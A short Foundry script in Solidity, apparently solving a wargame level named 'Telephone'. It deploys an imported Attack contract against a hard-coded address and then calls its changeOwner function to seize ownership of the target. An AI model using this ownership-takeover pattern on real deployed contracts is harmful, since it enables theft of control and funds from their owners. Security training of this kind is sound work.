pragma solidity ^0.8.0;
// SPDX-License-Identifier: MIT
import "forge-std/Script.sol";
import "../src/telephone.sol";

contract TelephoneScript is Script {
    function run() external {
        vm.startBroadcast();
       new Attack(0x6da3343148E27bDbA155AfaaAd9eF71176a897C4);
        vm.stopBroadcast();
    }
}

contract Attackk is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack=Attack(0xcD26f285d78cbf80ec25d652f6A2ffF3Bb48EB4D);
        attack.changeOwner();
        vm.stopBroadcast();
    }
}

